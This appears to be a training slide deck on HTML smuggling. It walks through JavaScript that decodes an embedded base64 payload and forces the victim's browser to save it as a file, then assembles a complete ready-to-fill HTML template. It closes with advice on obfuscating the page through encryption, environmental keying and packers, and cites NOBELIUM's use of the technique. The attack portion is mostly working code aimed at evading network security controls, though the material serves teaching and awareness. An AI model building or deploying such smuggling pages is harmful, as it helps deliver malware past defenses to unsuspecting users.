# HTML Smuggling
---
### What is it?
A method for embedding ("smuggling") payloads into Web Pages using HTML/JavaScript to evade network security controls.

---
### How does it work?
---
<!-- slide style="font-size:.7em" -->
Encode the payload and embed into the following
```javascript
var f = atob("{{ b64payload }}");
```

---
<!-- slide style="font-size:.7em" -->
Convert the decoded payload to a byte array
```js

var binaryArray = new Uint8Array(f.length);
for ( let i = 0; i < f.length; i++ ) {
	binaryArray[i] = f.charCodeAt(i)
}

```

---
<!-- slide style="font-size:.7em" -->
Now its time for the file download portion. 

<small>Internet Explorer is *special*. We'll handle that first</small>

```js

if (window.navigator.msSaveBlob) {
	var blob = new Blob([binaryArray]);
	window.navigator.msSaveBlob(blob, "{{ filename }}");
} 
```

IE doesn't support the `File` APIs we will cover next

---
<!-- slide style="font-size:.7em" -->
For everything else, we use the `File` API to generate a ObjectURL and simulate a hyperlink click
```js
else {
	var file = new File([binaryArray], "{{ filename }}", {type: "{{mimetype}}"})
	var a = window.document.createElement("a");
	a.href = window.URL.createObjectURL(file);
	a.download = "{{ filename }}";
	document.body.appendChild(a);
	a.click();
	document.body.removeChild(a);
}
```
`window.URL.createObjectURL` creates a special `blob://` url which points to your file in the browser document's memory.

The `download` attribute will configure the hyperlink to save the file as the specified filename

---
### Put it all together
Embedded into an HTML file
<!-- slide style="font-size:.5em" -->
```html
<!Doctype html>
<html>
	<head></head>
	<body>
		<script>
			var f = atob("{{ b64payload }}");
			
			var binaryArray = new Uint8Array(f.length);
			for ( let i = 0; i < f.length; i++ ) {
				binaryArray[i] = f.charCodeAt(i)
			}
			
			if (window.navigator.msSaveBlob) {
				var blob = new Blob([binaryArray]);
				window.navigator.msSaveBlob(blob, "{{ filename }}");
			} else {
				var file = new File([binaryArray], "{{ filename }}", {type: "{{mimetype}}"})
				var a = window.document.createElement("a");
				a.href = window.URL.createObjectURL(file);
				a.download = "{{ filename }}";
				document.body.appendChild(a);
				a.click();
				document.body.removeChild(a);
			}
		</script>
	</body>
</html>
```

---
### Obfuscate it
- Additional Encoding
- Encryption
	- Environmental Keying
- JavaScript packers/minifiers/obfuscators
	- https://obfuscator.io/
	- https://webpack.js.org/

---
### In The Wild
[NOBELIUM](https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/)

![[Pasted image 20221102101157.png]]

---
### Lets try it

---
### Resources
<!-- slide style="font-size:.7em" -->
- https://www.microsoft.com/en-us/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
- https://outflank.nl/blog/2018/08/14/html-smuggling-explained/
- https://github.com/nccgroup/demiguise
- https://github.com/cyberbutler/smuggle-me
